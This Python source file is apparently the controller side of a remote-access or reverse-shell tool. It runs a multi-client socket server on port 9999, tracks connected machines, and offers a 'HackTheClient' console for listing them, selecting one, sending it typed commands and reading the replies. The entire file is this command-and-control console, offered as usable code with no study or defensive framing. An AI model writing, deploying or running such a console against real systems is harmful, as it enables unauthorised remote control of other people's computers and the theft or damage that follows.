# SERVER (multi-client)

import socket
import threading

all_connections = list()
all_addresses = list()

host = ""
port = 9999

try:
    sockfd = socket.socket()
    print("Creation of socket successful.")
except:
    print("Socket creation error !")

while True:
    try:
        sockfd.bind((host, port))
        sockfd.listen(5)
        print(f"Socket binding successful on port {port}.")
        break
    except:
        print("Error in binding !\nRetrying...")


def socket_accept():
    while True:
        conn, addr = sockfd.accept()
        all_connections.append(conn)
        all_addresses.append(addr)
        print(f"{addr[0]}:{addr[1]} connected !")
#--------------------------------------------------------------------------------


def show_client():
    if len(all_connections) == 0:
        print("\nNO CLIENTS AVAILABLE AT THE MOMENT !")
        return None
    print("\n-----Available Clients-----")
    for i, j in enumerate(all_connections):
        try:
            j.send(" ".encode("utf-8"))
            j.recv(1024)
            print(f"{i} - {all_addresses[i][0]}:{all_addresses[i][1]}")
        except:
            # all_connections.remove(j)
            # all_addresses.remove(j)
            del all_connections[i]
            del all_addresses[i]
            continue
        finally:
            if len(all_connections) == 0:
                print("NO CLIENTS AVAILABLE AT THE MOMENT !")
                break


def send_recieve(conn, i):
    print(
        f"\n-----Successfully connected to {all_addresses[i][0]}:{all_addresses[i][1]}-----\n")
    conn.send("Server Connected".encode("utf-8"))
    while True:
        instruction = input(
            f"Connected--->{all_addresses[i][0]}:{all_addresses[i][1]}>> ")
        if instruction == "exit":
            conn.send(instruction.encode("utf-8"))
            break
        conn.send(instruction.encode("utf-8"))
        print("\n-----Waiting for Client's Response-----\n")
        print((conn.recv(1024)).decode("utf-8"))

#--------------------------------------------------------------------------------


def HackTheClient():  # server's terminal
    while True:
        htc_cmd = input("HackTheClient>> ")
        if htc_cmd == "quit":
            for i in all_connections:
                i.send(htc_cmd.encode("utf-8"))
            break

        elif htc_cmd == "show":
            show_client()
            print()

        elif "select" in htc_cmd:
            if all_connections[int(htc_cmd[7:])] is not None:
                send_recieve(
                    all_connections[int(htc_cmd[7:])], int(htc_cmd[7:]))
                print()
            else:
                # if the user selects out-of-range
                print("Invalid selection !")

        else:
            print("Inappropriate Command !")
#--------------------------------------------------------------------------------


thread_list = list()


def thread_task(i):
    if i == 0:
        socket_accept()
    elif i == 1:
        HackTheClient()


for i in range(2):
    t = threading.Thread(target=thread_task, args=(i,), daemon=True)
    thread_list.append(t)
    t.start()

for t in thread_list:
    t.join()
